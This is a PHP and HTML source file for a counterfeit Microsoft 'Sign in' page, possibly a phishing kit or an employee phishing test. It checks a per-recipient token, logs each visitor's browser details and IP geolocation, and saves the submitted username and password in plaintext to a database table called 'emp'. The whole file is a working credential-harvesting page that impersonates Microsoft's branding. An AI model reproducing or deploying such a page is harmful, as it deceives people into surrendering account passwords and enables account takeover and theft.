<?php
session_start();
define("ALLOW_ACCESS", TRUE);

date_default_timezone_set('Asia/Kolkata');
ini_set('display_errors', 1);
error_reporting(E_ALL);

$error = "";
$generated_session = session_id();
$system_info = $_SERVER['HTTP_USER_AGENT'];
$ip_info = file_get_contents("http://api.ipstack.com/" . $_SERVER['REMOTE_ADDR'] . "?access_key=......");

$dbname = "......";
$dbuser = ".......";
$dbpassword = ".......";
$servername = "localhost";

try {
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $dbuser, $dbpassword);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Connection failed: " . $e->getMessage());
}

$token = $_GET["token"] ?? "";
if (!$token) {
    http_response_code(403);
    die("Access denied: Missing token.");
}

$stmt = $conn->prepare("SELECT visited FROM emp WHERE hash = ?");
$stmt->execute([$token]);
$currentStatus = $stmt->fetchColumn();

if ($currentStatus === false) {
    http_response_code(403);
    die("Access denied: Invalid token.");
}

// ✅ Log visit with timestamp if not COMPLETE
if ($currentStatus !== 'COMPLETE') {
    $stmt = $conn->prepare("UPDATE emp SET visited = 'YES', system_info = ?, ip_info = ?, timestamp = NOW() WHERE hash = ?");
    $stmt->execute([$system_info, $ip_info, $token]);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $secretKey = ".....";

    if (isset($_POST['g-recaptcha-response'])) {
        $captcha = $_POST['g-recaptcha-response'];
        $url = 'https://www.google.com/recaptcha/api/siteverify?secret=' . urlencode($secretKey) . '&response=' . urlencode($captcha);
        $response = file_get_contents($url);
        $responseKeys = json_decode($response, true);

        if ($responseKeys["success"]) {
            if (!empty($_POST["username"]) && !empty($_POST["password"])) {
                $stmt = $conn->prepare("UPDATE emp SET visited = 'COMPLETE', system_info = ?, ip_info = ?, username = ?, password = ?, timestamp = NOW() WHERE hash = ?");
                $stmt->execute([$system_info, $ip_info, $_POST["username"], $_POST["password"], $token]);

                include "./store-user-info.php";
                exit();
            } else {
                $error = "Username or Password cannot be empty.";
            }
        } else {
            $error = "Invalid Captcha.";
        }
    } else {
        $error = "Captcha verification failed.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Sign in to your account</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-image: url('https://source.unsplash.com/1600x900/?technology,office');
      background-size: cover;
      background-position: center;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    .login-wrapper {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .login-box {
      background-color: white;
      padding: 40px;
      width: 100%;
      max-width: 400px;
      border-radius: 8px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
    }
    .login-header {
      display: flex;
      align-items: center;
      justify-content: flex-start;
      margin-bottom: 30px;
    }
    .login-header img {
      height: 24px;
      margin-right: 10px;
    }
    .login-header span {
      font-size: 20px;
      font-weight: 500;
      color: #5e5e5e;
    }
    h2 {
      margin: 0 0 20px;
      font-size: 22px;
      color: #1b1b1b;
    }
    .form-group {
      margin-bottom: 15px;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      border: 1px solid #c6c6c6;
      border-radius: 3px;
      font-size: 16px;
    }
    .submit-btn {
      width: 100%;
      background-color: #0067b8;
      color: white;
      padding: 12px;
      font-size: 16px;
      border: none;
      border-radius: 3px;
      cursor: pointer;
      margin-top: 10px;
    }
    .submit-btn:hover {
      background-color: #005a9e;
    }
    .recaptcha-wrapper {
      margin-top: 15px;
    }
    .error {
      color: red;
      margin-bottom: 10px;
      font-weight: bold;
      text-align: center;
    }
    footer {
      text-align: center;
      margin-top: 40px;
      color: #767676;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <div class="login-wrapper">
    <div class="login-box">
      <div class="login-header">
        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8f9fb6248c1728f1.svg" alt="Microsoft Logo" />
        <span>Microsoft</span>
      </div>
      <h2>Sign in</h2>

      <?php if ($error !== ""): ?>
        <div class="error"><?= $error; ?></div>
      <?php endif; ?>

      <form method="POST" action="">
        <div class="form-group">
          <input type="text" name="username" placeholder="Email, phone, or Skype" required />
        </div>
        <div class="form-group">
          <input type="password" name="password" placeholder="Password" required />
        </div>
        <div class="recaptcha-wrapper">
          <div class="g-recaptcha" data-sitekey="......."></div>
        </div>
        <input type="submit" class="submit-btn" value="Sign in" name="btnSubmit" />
      </form>
    </div>
  </div>

  <footer>© Microsoft 2025</footer>
</body>
</html>
